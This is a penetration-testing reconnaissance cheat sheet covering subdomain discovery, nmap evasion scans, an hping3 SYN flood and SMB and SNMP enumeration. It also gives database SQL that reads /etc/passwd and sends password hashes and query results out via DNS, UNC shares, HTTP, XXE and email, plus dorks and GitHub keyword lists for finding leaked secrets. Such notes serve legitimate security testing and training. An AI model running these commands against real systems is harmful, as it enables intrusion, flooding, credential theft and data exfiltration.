# Investigate

## 2.1.1

### 1.Whois

whois [domain.com]

https://www.whois.com/whois/

https://centralops.net/co/DomainDossier.aspx

### 2.DNS

dia a [domain.com]

dnsrecon -d [domain.com] -t axfr

dnsenum [domain.com]

dnsdumpster.com

### 3.CDN

17ce.com

sitereport.netcraft.com

### 4.Subdomain

searchdns.netcraft.com

crt.sh

#### Aort

```bash
python3 -m venv aort
source aort/bin/activate
pip3 install aort
```

aort -d [domain.com] --output subdomains.txt

#### Dome

```bash
git clone https://github.com/v4d1/Dome
cd Dome
python3 -m venv Dome
source Dome/bin/activate
pip install -r requirements.txt
```

python3 dome.py -m passive -d [domain.com]

python3 dome.py -d [domain.com] -m active -w wordlists/wordlist.txt

#### Anubis

```bash
mkdir anubis
cd anubis
python3 -m venv anubis
source anubis/bin/activate
pip3 install anubis-netsec
```

anubis -tip [domain.com] -o [output.txt]

anubis -t [domain.com] --with-nmap -o [output.txt] -i --overwrite-nmap-scan "-F -T5"

#### Subfinder

```bash
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
```

./subfinder -d [domain.com]

### 5.Host Enumeration

```bash
hping3 --scan [port] -S [domain.com/IP address]
hping3 -S --flood --rand-source -p [port] [domain.com/IP address]
nmap -A -T4 [domain.com/IP address]
nmap -T4 -p 1-65535 [domain.com/IP address]  //Full port scan
nmap -T4 [domain.com/IP address] --spoof-mac 0  //Fake MAC address
nmap -T4 -f [domain.com/IP address]  //request packet fragmentation
nmap -D [IP address1,IP address2,......] [IP address/domain.com]  //Fake IP address and insert attacker IP address
nmap -D RND [Number of random IP addresses] [IP address/domain.com]  //Random IP address forgery
nmap --spoof-mac 0 --data-length 24 -T4 -f --mtu 16 -D RND -sS -sV -p 1-65535 -n -oA [output.txt] [IP address/domain.com]
//High stealth scan

nmap [IP address segment] --open -oG scan; cat scan | grep "/open" | cut -d " " -f 2 > active
cat active
//View the surviving IP addresses of the address segment

for x in 80 8080 443; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x [IP address segment]; done
//Enumerate address segment port status
```

## 2.1.2

### 1.Directory file

#### GoBuster

```bash
go install github.com/OJ/gobuster/v3@latest
```

./gobuster dir -u [domain.com/IP address] -w [dictionary file]

./gobuster dir -u [domain.com/IP address] -c 'cookie' -t 50 -w [dictionary file]

#### Dirb

dirb [domain.com/IP address]

dirb [domain.com/IP address] -c "cookie"

dirb [domain.com/IP address] -p [Proxy IP address:Proxy port number]

dirb [domain.com/IP address] -a "User-Agent" [dictionary file]

#### Wfuzz

```bash
wfuzz -w [dictionary file] --hc 404 [domain.com/IP address]/FUZZ
wfuzz -w [dictionary file] -w [dictionary file] -w [dictionary file] --hc 404 [domain.com/IP address]/FUZZ/FUZ2ZFUZ3Z
wfuzz -w [dictionary file] --hc 404 [domain.com/IP address]/FUZZ.php
//Enumerate php files
wfuzz -z file,[dictionary file] -d "[username parameter]=FUZZ&[password parameter]=FUZZ" --hc 302 [domain.com/IP address]
//Enumerate username and password
wfuzz -w [dictionary file] -b cookie="cookie" [domain.com/IP address]/FUZZ
//Enumerate sites after login
wfuzz -f,/[dictionary file] -p [Proxy IP address:Proxy port number] --hc 404 [domain.com/IP address]/FUZZ
//Use proxy enumeration
```

#### ffuf

```bash
ffuf -u [domain.com/IP address]/FUZZ -c -w [dictionary file]
ffuf -mc all -fc 404 -ac -sf -s -w [dictionary file] -c -u [domain.com/IP address]/FUZZ
ffuf -u [domain.com/IP address]/FUZZ -w [dictionary file] -recursion -c //Recursive scan
ffuf -u [domain.com/IP address]/FUZZ -w [dictionary file] -recursion -e .[File extension] -c
//Enumeration suffix files
```

#### Dictionary file

https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content

### 2.Website fingerprinting

#### Plugins

Wappalyzer

What runs

#### WhatWEB

```bash
whatweb [domain.com/IP address]
whatweb [domain.com/IP address] -v
whatweb [domain.com/IP address] -H:[HTTP]:[HTTP] -U:[User-Agent]
```

### 3.Waf

```bash
wafw00f [domain.com/IP address]
```

### 4.Web extraction

#### Gospider

```bash
go install github.com/jaeles-project/gospider@latest
./gospider -s "http://[domain.com/IP address]/" --js -t 20 -d 2 --sitemap --robots -w -r > urls.txt
cat urls.txt | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
```

#### Curl

```bash
curl [domain.com/IP address]/[JavaScript file] | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
```

#### LinkFinder

```bash
python3 linkfinder.py -d -i [domain.com/IP address]
```

### 5.Run service

#### SAMB/SMB

```bash
nbtscan [IP address]
nmblookup -A [IP address]
nbtstat -A [IP address]
enum4linux [IP address]
smbmap -H [IP address]

smbclient -L [IP address]
smbclient //[IP address]/[Shared drive or folder]
//Connect to the SMB service of the target host

nmap --script smb-enum-shares -p139,445 [IP address]
//List shared drives using Nmap

crackmapexec smb [IP address] -u 'SMB username' -p 'SMB password' –shares
//Enumerate SMB shares

use auxiliary/scanner/smb/smb_lookupsid
//View the local users of the target host
```

#### SNMP

```bash
nmap -sU -p161 -script=snmp-brute [IP address]
snmpwalk -v 1 -c [IP address]
snmpset -v 1 -c public [IP address] iso.3.6.1.2.1.1.5.0 s [change string content]
snmpwalk -v 1 -c public [IP address] 1.3.6.1.2.1.1.5.0
snmpwalk -v 1 -c public [IP address] 1.3.6.1.2.1.25.2.2  //View system memory size
snmpwalk -v 1 -c public [IP address] 1.3.6.1.2.1.4.20  //View the IP address in the system
snmpwalk -v 1 -c public [IP address] 1.3.6.1.2.1.1  //View system information
nmap -sU -p161 -script=snmp-sysdescr [IP address]
snmp-check [IP address] -p 161 -c public
```

#### NFS/RPC

```bash
showmount -e [IP address]
rpcinfo -p [IP address]
nmap -sV -script=nfs-showmount [IP address]
```

#### MySql

```bash
nmap --script=mysql-info -p3306 [IP address]
```

```sql
SELECT host, user FROM mysql.user WHERE Super_priv = 'Y';
//DBA Accounts
SELECT @@datadir;
//Path to Data
SELECT LOAD_FILE('/etc/passwd')；
SELECT LOAD_FILE(0x2f6574632f706173737764);
//Read File
```

Data Exfiltration

```sql
SELECT LOAD_FILE(concat('\\\\',(sql statement), '.[DNSLog host]\\'));
//DNS Request
SELECT * FROM USERS INTO OUTFILE '\\[IP address]\[SMB drives and file sharing]\output.txt';
//SMB Share
SELECT * FROM USERS INTO OUTFILE '/var/www/html/output.txt';
//HTTP Server
```

#### Oracle

```sql
SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = 'YES';
//DBA Accounts

SELECT * FROM session_privs;
SELECT * FROM dba_sys_privs WHERE grantee = 'DBSNMP';
SELECT grantee FROM dba_sys_privs WHERE privilege = 'SELECT ANY DICTIONARY';
SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;
//Privileges

SELECT name FROM V$DATAFILE;
//Location of DB Files

SELECT UTL_INADDR.get_host_name FROM dual;
SELECT host_name FROM v$instance;
SELECT UTL_INADDR.get_host_address FROM dual;
SELECT UTL_INADDR.get_host_name('[IP address]') FROM dual;
//Hostname, IP address
```

Read file

```sql
SQL>
declare
  f utl_file.file_type;
  s varchar(200);
begin
  f := utl_file.fopen('/root', '[file]', 'R');
  utl_file.get_line(f,s);
  utl_file.fclose(f);
  dbms_output.put_line(s);
end;
/
set serveroutput ON  //Allow screen output
/  //Run the command again to view the 200 characters of the specified text file
```

Data Exfiltration

```sql
SELECT xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://IP/test"> %remote; %param1;]>') FROM dual;
//XML external entity

SELECT UTL_HTTP.request ('http://[IP address]/') FROM dual;
//UTL_HTTP

SELECT UTL_URL.escape('http://IP/' || USER) FROM dual;
//Escaping special characters
```

#### SQL Server

```bash
auxiliary/scanner/mssql/mssql_ping
auxiliary/admin/mssql/mssql_sql
admin/mssql/mssql_enum
```

https://github.com/NetSPI/PowerUpSQL/tree/master/templates/tsql

```powershell
powershell -ep bypass
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceLocal -Verbose  //Get SQL Server Status
Get-SQLServerInfoThreaded -Threads 10 -Verbose  //Obtain basic host information
Get-SQLDomainComputer  //View the current domain host
```

Read file

```sql
1.txt
sp_configure 'show advanced options',1
reconfigure
go
//Enable show advanced options
sp_configure 'ad hoc distributed queries',1
reconfigure
go
//Enable ad hoc queries
EXEC sp_MSset_oledb_prop
//list available providers
SELECT * FROM OpenDataSource( 'Microsoft.ACE.OLEDB.12.0','Data Source="c:\temp";Extended properties="Text;hdr=no"')...file#txt
//Read a text file

2.Local files
CREATE TABLE #file (content nvarchar(4000));
//Create temp table
BULK INSERT #file FROM 'c:\temp\file.txt';
//Read file into temp table
SELECT content FROM #file

3.UNC
CREATE TABLE #file (content nvarchar(4000));
BULK INSERT #file FROM '\\127.0.0.1\c$\temp\file.txt';
//Read file into temp table
SELECT content FROM #file
DROP TABLE #file
//Drop temp table

4.WebDav
CREATE TABLE #file (content nvarchar(4000));
BULK INSERT #file FROM '\\sharepoint.acme.com@SSL\Path\to\file.txt';
SELECT content FROM #file
DROP TABLE #file

5.xlsx
sp_configure 'show advanced options',1
reconfigure
go
//Enable show advanced options
sp_configure 'ad hoc distributed queries',1
reconfigure
go
//Enable ad hoc queries
EXEC sp_MSset_oledb_prop
//list available providers
SELECT * FROM OPENDATASOURCE('Microsoft.ACE.OLEDB.12.0','Data Source=C:\windows\temp\Book1.xlsx;Extended Properties=Excel 8.0')...[Targets$]
//Read files, suitable for UNC paths and WebDav paths (target web server needs to support propfind)

6.OpenRowSet
sp_configure 'show advanced options',1
reconfigure
go
//Enable show advanced options
sp_configure 'ad hoc distributed queries',1
reconfigure
go
Enable ad hoc queries
SELECT cast(BulkColumn as varchar(max)) as Document FROM OPENROWSET(BULK N'C:\windows\temp\blah.txt', SINGLE_BLOB) AS Document
//Read files, suitable for UNC paths and WebDav paths (target web server needs to support propfind)

7.OpenRowSet txt
EXEC sp_MSset_oledb_prop
//list available providers
sp_configure 'show advanced options',1
reconfigure
go
//Enable show advanced options
sp_configure 'ad hoc distributed queries',1
reconfigure
go
//Enable ad hoc queries
SELECT * FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0','Text;Database=c:\temp\;HDR=Yes;FORMAT=text', 'SELECT * FROM [file.txt]')
//Read files, suitable for UNC paths and WebDav paths (target web server needs to support propfind)

8.OpenRowSet xlsx
EXEC sp_MSset_oledb_prop
//list available providers
sp_configure 'show advanced options',1
reconfigure
go
//Enable show advanced options
sp_configure 'ad hoc distributed queries',1
reconfigure
go
//Enable ad hoc queries
SELECT column1 FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0', 'Excel 12.0;Database=C:\windows\temp\Book1.xlsx;', 'SELECT * FROM [Targets$]')
//Read files, suitable for UNC paths and WebDav paths (target web server needs to support propfind)
```

Data Exfiltration

```sql
DECLARE @host varchar(800);
select @host = name + '-' + master.sys.fn_varbintohexstr(password_hash) + '.domain.com' from sys.sql_logins;
exec('xp_fileexist "\' + @host + \'c$boot.ini"');
//DNS

xp_dirtree '\\data.domain.com\file'
//UNC

sp_configure 'show advanced options', 1;RECONFIGURE;sp_configure 'Database Mail XPs', 1;RECONFIGURE;exec msdb..sp_send_dbmail @recipients='snowwolf@email.com',@query='select @@version';
//sp_send_dbmail

EXEC master..xp_sendmail 'snowwolf@email.com', 'test.'
//Basic xp_sendmail Query

EXEC xp_sendmail @recipients='snowwolf@email.com',
@message='test.',
@copy_recipients='snowwolf@email.com',
@subject='TEST'
//Send Full Email with xp_sendmail

EXEC xp_sendmail 'snowwolf@email.com', @query='SELECT @@version';
//Send Query Results Via xp_sendmail

CREATE TABLE ##texttab (c1 text)
INSERT ##texttab values ('test.')
DECLARE @cmd varchar(56)
SET @cmd = 'SELECT c1 from ##texttab'
EXEC master.dbo.xp_sendmail 'robertk',
@query = @cmd, @no_header='TRUE'
DROP TABLE ##texttab
//Send Query Results as Attachment Via xp_sendmail
```

## 2.1.3

### Amass

```bash
amass enum -passive -d [domain.com] -src
amass enum -active -d [domain.com]
amass enum -v -src -ip -brute -min-for-recursive 2 -d [domain.com]
amass viz -d3 -d [domain.com]
```

### IVRE

```bash
apt install ivre ivre-doc
ivre ipinfo –init  //Initialize IP address information
ivre scancli –init  //Initialize the active scan database
ivre view –init  //Initialize view information
ivre flowcli –init  //Initialize data flow information
sudo ivre runscansagentdb –init  //Initiate remote proxy scan
ivre ipdata –download  //Download IP address data
ivre runscans --routable --limit 100 --output=XMLFork --processes 10
//Run 10 concurrent Nmap processes to enumerate 100 random IP addresses
ivre scan2db -c ROUTABLE-001 -s MySource -r scans/ROUTABLE/up
//Analyze Nmap scan results and add them to the database
ivre db2view nmap
//Create views from Nmap scan results and passive reconnaissance databases
ivre scancli –count
//Statistical data
ivre httpd --bind-address 0.0.0.0
//Start WEB graphical display

rm -rf scans/ROUTABLE/*
//Clear test data
ivre scancli --init && ivre view –init //Data initialization
ivre runscans --routable --categories [custom category name] --network [network segment] --output=XMLFork --processes 10  //Custom network segment scanning
ivre scan2db -c [custom category name] -s [Scan source] -r scans/[custom category name]/up
ivre db2view nmap
ivre httpd --bind-address 0.0.0.0
```

### Online site

https://osintframework.com/

https://github.com/cipher387/osint_stuff_tool_collection

Shodan、Censys、BinaryEdge

## 2.2.1

https://www.social-searcher.com/

https://github.com/lorien/awesome-osint-1#social-media-tools

## 2.2.2

https://freepeoplesearchtool.com/

"Microsoft" site:linkedin.com/in

## 2.3.1

https://opencorporates.com/

https://www.corporationwiki.com/

## 2.3.2

### Google

```dork
site:http://ideone.com | site:http://codebeautify.org | site:http://codeshare.io | site:http://codepen.io | site:http://repl.it | site:http://jsfiddle.net "company"
//Code sharing
site:github.com | site:gitlab.com | site:bitbucket.org "company"
site:stackoverflow.com "target.com"
site:http://trello.com | site:*.atlassian.net "company"
//Project management site
site:http://justpaste.it | site:http://pastebin.com "company"
site:target.com ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt | ext:ora | ext:env | ext:ini
//Configuration file
site:target.com ext:sql | ext:dbf | ext:mdb
//Database file
site:target.com ext:bkf | ext:bkp | ext:bak | ext:old | ext:backup
//Backup file
inurl:"/.git" target.com -github
//git file
site:target.com ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv
//Public documents
site:target.com intitle:index.of | ext:log | ext:php intitle:phpinfo "published by the PHP Group" | inurl:shell | inurl:backdoor | inurl:wso | inurl:cmd | shadow | passwd | boot.ini | inurl:backdoor | inurl:readme | inurl:license | inurl:install | inurl:setup | inurl:config | inurl:"/phpinfo.php" | inurl:".htaccess" | ext:swf
//Other documents
site:target.com intext:"sql syntax near" | intext:"syntax error has occurred" | intext:"incorrect syntax near" | intext:"unexpected end of SQL command" | intext:"Warning: mysql_connect()" | intext:"Warning: mysql_query()" | intext:"Warning: pg_connect()"
//SQL error
site:target.com "PHP Parse error" | "PHP Warning" | "PHP Error"
//PHP error
site:target.com inurl:signup | inurl:register | intitle:Signup
//Log in page
site:target.com inurl:redir | inurl:url | inurl:redirect | inurl:return | inurl:src=http | inurl:r=http
//Redirect
site:target.com ext:action | ext:struts | ext:do
//Apache Struts RCE
site:pastebin.com target.com
site:linkedin.com employees target.com
//LinkedIn Employee Search
site:target.com inurl:wp-content | inurl:wp-includes
//WordPress file
site:*.target.com
//Subdomain
site:*.*.target.com
//Subdomain
site:.s3.amazonaws.com | site:http://storage.googleapis.com | site:http://amazonaws.com "target"
//S3 bucket
intitle:traefik inurl:8080/dashboard "target"
intitle:"Dashboard [Jenkins]"
```

https://www.exploit-db.com/google-hacking-database

### Github

```bash
".mlab.com password"
"access_key"
"access_token"
"amazonaws"
"api.googlemaps AIza"
"api_key"
"api_secret"
"apidocs"
"apikey"
"apiSecret"
"app_key"
"app_secret"
"appkey"
"appkeysecret"
"application_key"
"appsecret"
"appspot"
"auth"
"auth_token"
"authorizationToken"
"aws_access"
"aws_access_key_id"
"aws_key"
"aws_secret"
"aws_token"
"AWSSecretKey"
"bashrc password"
"bucket_password"
"client_secret"
"cloudfront"
"codecov_token"
"config"
"conn.login"
"connectionstring"
"consumer_key"
"credentials"
"database_password"
"db_password"
"db_username"
"dbpasswd"
"dbpassword"
"dbuser"
"dot-files"
"dotfiles"
"encryption_key"
"fabricApiSecret"
"fb_secret"
"firebase"
"ftp"
"gh_token"
"github_key"
"github_token"
"gitlab"
"gmail_password"
"gmail_username"
"herokuapp"
"internal"
"irc_pass"
"JEKYLL_GITHUB_TOKEN"
"key"
"keyPassword"
"ldap_password"
"ldap_username"
"login"
"mailchimp"
"mailgun"
"master_key"
"mydotfiles"
"mysql"
"node_env"
"npmrc _auth"
"oauth_token"
"pass"
"passwd"
"password"
"passwords"
"pem private"
"preprod"
"private_key"
"prod"
"pwd"
"pwds"
"rds.amazonaws.com password"
"redis_password"
"root_password"
"secret"
"secret.password"
"secret_access_key"
"secret_key"
"secret_token"
"secrets"
"secure"
"security_credentials"
"send.keys"
"send_keys"
"sendkeys"
"SF_USERNAME salesforce"
"sf_username"
"site.com" FIREBASE_API_JSON=
"site.com" vim_settings.xml
"slack_api"
"slack_token"
"sql_password"
"ssh"
"ssh2_auth_password"
"sshpass"
"staging"
"stg"
"storePassword"
"stripe"
"swagger"
"testuser"
"token"
"x-api-key"
"xoxb "
"xoxp"
Jenkins
OTP
oauth
authoriztion
password
pwd
ftp
dotfiles
JDBC
key-keys
send_key-keys
send,key-keys
token
user
login-singin
passkey-passkeys
pass
secret
SecretAccessKey
app_AWS_SECRET_ACCESS_KEY AWS_SECRET_ACCESS_KEY
credentials
config
security_credentials
connectionstring
ssh2_auth_password
DB_PASSWORD
[WFClient] Password= extension:ica
access_key
bucket_password
dbpassword
dbuser
extension:avastlic "support.avast.com"
extension:bat
extension:cfg
extension:env
extension:exs
extension:ini
extension:json api.forecast.io
extension:json googleusercontent client_secret
extension:json mongolab.com
extension:pem
extension:pem private
extension:ppk
extension:ppk private
extension:properties
extension:sh
extension:sls
extension:sql
extension:sql mysql dump
extension:sql mysql dump password
extension:yaml mongolab.com
extension:zsh
filename:.bash_history
filename:.bash_history DOMAIN-NAME
filename:.bash_profile aws
filename:.bashrc mailchimp
filename:.bashrc password
filename:.cshrc
filename:.dockercfg auth
filename:.env DB_USERNAME NOT homestead
filename:.env MAIL_HOST=smtp.gmail.com
filename:.esmtprc password
filename:.ftpconfig
filename:.git-credentials
filename:.history
filename:.htpasswd
filename:.netrc password
filename:.npmrc _auth
filename:.pgpass
filename:.remote-sync.json
filename:.s3cfg
filename:.sh_history
filename:.tugboat NOT _tugboat
filename:_netrc password
filename:apikey
filename:bash
filename:bash_history
filename:bash_profile
filename:bashrc
filename:beanstalkd.yml
filename:CCCam.cfg
filename:composer.json
filename:config
filename:config irc_pass
filename:config.json auths
filename:config.php dbpasswd
filename:configuration.php JConfig password
filename:connections
filename:connections.xml
filename:constants
filename:credentials
filename:credentials aws_access_key_id
filename:cshrc
filename:database
filename:dbeaver-data-sources.xml
filename:deployment-config.json
filename:dhcpd.conf
filename:dockercfg
filename:environment
filename:express.conf
filename:express.conf path:.openshift
filename:filezilla.xml
filename:filezilla.xml Pass
filename:git-credentials
filename:gitconfig
filename:global
filename:history
filename:htpasswd
filename:hub oauth_token
filename:id_dsa
filename:id_rsa
filename:id_rsa or filename:id_dsa
filename:idea14.key
filename:known_hosts
filename:logins.json
filename:makefile
filename:master.key path:config
filename:netrc
filename:npmrc
filename:pass
filename:passwd path:etc
filename:pgpass
filename:prod.exs
filename:prod.exs NOT prod.secret.exs
filename:prod.secret.exs
filename:proftpdpasswd
filename:recentservers.xml
filename:recentservers.xml Pass
filename:robomongo.json
filename:s3cfg
filename:secrets.yml password
filename:server.cfg
filename:server.cfg rcon password
filename:settings
filename:settings.py SECRET_KEY
filename:sftp-config.json
filename:sftp-config.json password
filename:sftp.json path:.vscode
filename:shadow
filename:shadow path:etc
filename:spec
filename:sshd_config
filename:token
filename:tugboat
filename:ventrilo_srv.ini
filename:WebServers.xml
filename:wp-config
filename:wp-config.php
filename:zhrc
HEROKU_API_KEY language:json
HEROKU_API_KEY language:shell
HOMEBREW_GITHUB_API_TOKEN language:shell
jsforce extension:js conn.login
language:yaml -filename:travis
msg nickserv identify filename:config
org:Target "AWS_ACCESS_KEY_ID"
org:Target "list_aws_accounts"
org:Target "aws_access_key"
org:Target "aws_secret_key"
org:Target "bucket_name"
org:Target "S3_ACCESS_KEY_ID"
org:Target "S3_BUCKET"
org:Target "S3_ENDPOINT"
org:Target "S3_SECRET_ACCESS_KEY"
password
path:sites databases password
private -language:java
PT_TOKEN language:bash
redis_password
root_password
secret_access_key
SECRET_KEY_BASE=
shodan_api_key language:python
WORDPRESS_DB_PASSWORD=
xoxp OR xoxb OR xoxa
s3.yml
.exs
beanstalkd.yml
deploy.rake
.sls

language:bash password
language:bash pwd
language:bash ftp
language:bash dotfiles
language:bash JDBC
language:bash key-keys
language:bash send_key-keys
language:bash send,key-keys
language:bash token
language:bash user
language:bash login-singin
language:bash passkey-passkeys
language:bash pass
language:bash secret
language:bash credentials
language:bash config
language:bash security_credentials
language:bash connectionstring
language:bash ssh2_auth_password

language:python password
language:python pwd
language:python ftp
language:python dotfiles
language:python JDBC
language:python key-keys
language:python send_key-keys
language:python send,key-keys
language:python token
language:python user
language:python login-singin
language:python passkey-passkeys
language:python pass
language:python secret
language:python credentials
language:python config
language:python security_credentials
language:python connectionstring
language:python ssh2_auth_password

org:facebookresearch https://
org:facebookresearch http://
org:facebookresearch ldap
org:facebookresearch ftp
org:facebookresearch sftp
org:facebookresearch host:
org:facebookresearch login
```

### LeakLooker

```bash
git clone https://github.com/woj-ciech/LeakLooker-X
cd LeakLooker-X
python3 -m venv LeakLooker
source LeakLooker/bin/activate
apt-get install python3-jsbeautifier celery
pip install -r requirements.txt
pip install jsbeautifier
python3 manage.py makemigrations
python3 manage.py migrate

Modify the Binary Edge API in the config.json file in the main directory

python3 manage.py runserver

start another terminal
apt-get install redis redis-server
redis-server

Start the terminal again and switch to the tool home directory
celery -A leaklooker worker --loglevel=info

Command

Rsync:
rsync -az IP:/module ~/ — progress
rsync — list-only IP:/
rsync -avrz /opt/data/filename root@ip:/opt/data/file

CouchDb:
/_all_dbs
<db>/_all_docs?include_docs=true&limit=50
/<db>/doc?rev=<nr>
<db>/doc
<db>/doc/<name>
/<db>/<docid>
/<db>/<id>/<attachment_id>

MongoDB:
show databases
use ‘db’
show collections
db.’collection’.stats()
db.’collection’.findOne()
db.’collection’.find().prettyPrint()
db.’collection’.find()

Elastic:
_cat/nodes?v
_cat/count?v
<indices>/_search?size=50
```

### Mail

Hunter.io

filetype:xls inurl:"email.xls" site:"domain.com"
